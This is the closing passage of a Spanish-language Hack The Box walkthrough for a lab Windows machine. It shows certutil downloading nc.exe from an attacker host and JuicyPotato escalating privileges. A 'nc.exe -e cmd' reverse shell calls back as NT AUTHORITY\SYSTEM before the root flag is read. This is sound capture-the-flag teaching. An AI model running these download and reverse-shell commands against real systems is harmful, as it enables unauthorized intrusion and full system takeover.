+</span></span><span style="display:flex;"><span>-a---         4/25/2023  10:48 PM     347648 JuicyPotato.exe                   
+</span></span><span style="display:flex;"><span>PS C:\Windows\Temp\Privesc&gt; certutil.exe -urlcache -split -f http://Tu_IP:8000/nc.exe nc.exe
+</span></span><span style="display:flex;"><span>****  Online  ****
+</span></span><span style="display:flex;"><span>  0000  ...
+</span></span><span style="display:flex;"><span>  e800
+</span></span><span style="display:flex;"><span>CertUtil: -URLCache command completed successfully.
+</span></span><span style="display:flex;"><span>PS C:\Windows\Temp\Privesc&gt; dir
+</span></span><span style="display:flex;"><span>    Directory: C:\Windows\Temp\Privesc
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime     Length Name                              
+</span></span><span style="display:flex;"><span>----                -------------     ------ ----                              
+</span></span><span style="display:flex;"><span>-a---         4/25/2023  10:48 PM     347648 JuicyPotato.exe                   
+</span></span><span style="display:flex;"><span>-a---         4/25/2023  10:48 PM      59392 nc.exe
+</span></span></code></pre></div><p>Listo, ahora usemos el <strong>Juicy Potato</strong>.</p>
+<h3 id="Juicy">Usando el Juicy Potato</h3>
+<p>Para ver la forma de usarlo, usemos el parámetro <strong>-h</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>PS C:\Windows\Temp\Privesc&gt; .\JuicyPotato.exe -h
+</span></span><span style="display:flex;"><span>JuicyPotato v0.1 
+</span></span><span style="display:flex;"><span>Mandatory args: 
+</span></span><span style="display:flex;"><span>-t createprocess call: &lt;t&gt; CreateProcessWithTokenW, &lt;u&gt; CreateProcessAsUser, &lt;*&gt; try both
+</span></span><span style="display:flex;"><span>-p &lt;program&gt;: program to launch
+</span></span><span style="display:flex;"><span>-l &lt;port&gt;: COM server listen port
+</span></span><span style="display:flex;"><span>Optional args: 
+</span></span><span style="display:flex;"><span>-m &lt;ip&gt;: COM server listen address (default 127.0.0.1)
+</span></span><span style="display:flex;"><span>-a &lt;argument&gt;: command line argument to pass to program (default NULL)
+</span></span><span style="display:flex;"><span>-k &lt;ip&gt;: RPC server ip address (default 127.0.0.1)
+</span></span><span style="display:flex;"><span>-n &lt;port&gt;: RPC server listen port (default 135)
+</span></span><span style="display:flex;"><span>-c &lt;{clsid}&gt;: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
+</span></span><span style="display:flex;"><span>-z only test CLSID and print token&#39;s user
+</span></span></code></pre></div><p>Bien, ahora vamos a mandar una <strong>cmd</strong> como <strong>NT Authority System</strong> a nuestra máquina. Para esto, hagamos lo siguiente:</p>
+<ul>
+<li>Abre una <strong>netcat</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">1337</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1337</span> ...
+</span></span></code></pre></div><ul>
+<li>Usa el siguiente oneliner usando <strong>JuicyPotato.exe</strong> y la <strong>nc.exe</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>PS C:\Windows\Temp\Privesc&gt; .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a <span style="color:#e6db74">&#34;/c C:\Windows\Temp\Privesc\nc.exe -e cmd Tu_IP 1337&#34;</span>
+</span></span><span style="display:flex;"><span>Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>[+] authresult 0
+</span></span><span style="display:flex;"><span>{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+</span></span><span style="display:flex;"><span>[+] CreateProcessWithTokenW OK
+</span></span></code></pre></div><ul>
+<li>Veamos la <strong>netcat</strong> y ya estaremos conectados:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">1337</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1337</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.93<span style="color:#f92672">]</span> <span style="color:#ae81ff">49167</span>
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7600<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
+</span></span></code></pre></div><p>Afortunadamente no nos pidio un <strong>CLSID</strong>, por lo que fue más sencillo utilizar el <strong>Juicy Potato</strong>.</p>
+<ul>
+<li>Ya solo busca la flag que te falta:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\Windows\system32<span style="color:#75715e">&gt;cd ../../Users</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">cd</span> ../../Users
+</span></span><span style="display:flex;"><span>C:\Users<span style="color:#75715e">&gt;dir </span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">dir</span>
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is 5084-30B0
+</span></span><span style="display:flex;"><span> Directory of C:\Users
+</span></span><span style="display:flex;"><span>05/31/2018  12:18 AM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>05/31/2018  12:18 AM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>05/31/2018  12:18 AM    &lt;DIR&gt;          Administrator
+</span></span><span style="display:flex;"><span>05/30/2018  04:44 AM    &lt;DIR&gt;          Classic .NET AppPool
+</span></span><span style="display:flex;"><span>05/30/2018  12:22 AM    &lt;DIR&gt;          merlin
+</span></span><span style="display:flex;"><span>05/30/2018  05:44 AM    &lt;DIR&gt;          Public
+</span></span><span style="display:flex;"><span>               0 File(s)              0 bytes
+</span></span><span style="display:flex;"><span>               6 Dir(s)  11,884,220,416 bytes free
+</span></span><span style="display:flex;"><span>C:\Users<span style="color:#75715e">&gt;cd Administrator/Desktop</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">cd</span> Administrator/Desktop
+</span></span><span style="display:flex;"><span>C:\Users\Administrator\Desktop<span style="color:#75715e">&gt;dir</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">dir</span>
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is 5084-30B0
+</span></span><span style="display:flex;"><span> Directory of C:\Users\Administrator\Desktop
+</span></span><span style="display:flex;"><span>05/31/2018  12:18 AM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>05/31/2018  12:18 AM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>04/25/2023  10:17 PM                34 root.txt
+</span></span><span style="display:flex;"><span>               1 File(s)             34 bytes
+</span></span><span style="display:flex;"><span>               2 Dir(s)  11,884,220,416 bytes free
+</span></span><span style="display:flex;"><span>C:\Users\Administrator\Desktop<span style="color:#75715e">&gt;type root.txt</span>
+</span></span></code></pre></div><p>Y con esto ya tendremos la máquina terminada.</p>
+<p>Te comparto este link sobre cómo usar el <strong>Juicy Potato</strong>:</p>
+<ul>
+<li><a href="https://infinitelogins.com/2020/12/09/windows-privilege-escalation-abusing-seimpersonateprivilege-juicy-potato/" target="_blank">Windows Privilege Escalation: Abusing SeImpersonatePrivilege with Juicy Potato</a></li>
+</ul>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://noticiasseguridad.com/importantes/como-hacer-pruebas-de-penetracion-de-con-wfuzz/" target="_blank" rel="noopener noreferrer">https://noticiasseguridad.com/importantes/como-hacer-pruebas-de-penetracion-de-con-wfuzz/</a></li><li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services" target="_blank" rel="noopener noreferrer">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services</a></li><li><a href="https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/" target="_blank" rel="noopener noreferrer">https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/</a></li><li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank" rel="noopener noreferrer">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a></li><li><a href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1" target="_blank" rel="noopener noreferrer">https://github.com/ohpe/juicy-potato/releases/tag/v0.1</a></li><li><a href="https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato" target="_blank" rel="noopener noreferrer">https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato</a></li><li><a href="https://infinitelogins.com/2020/12/09/windows-privilege-escalation-abusing-seimpersonateprivilege-juicy-potato/" target="_blank" rel="noopener noreferrer">https://infinitelogins.com/2020/12/09/windows-privilege-escalation-abusing-seimpersonateprivilege-juicy-potato/</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/htb-writeup-valentine/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Valentine - Hack The Box</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/htb-writeup-active/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">Active - Hack The Box</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
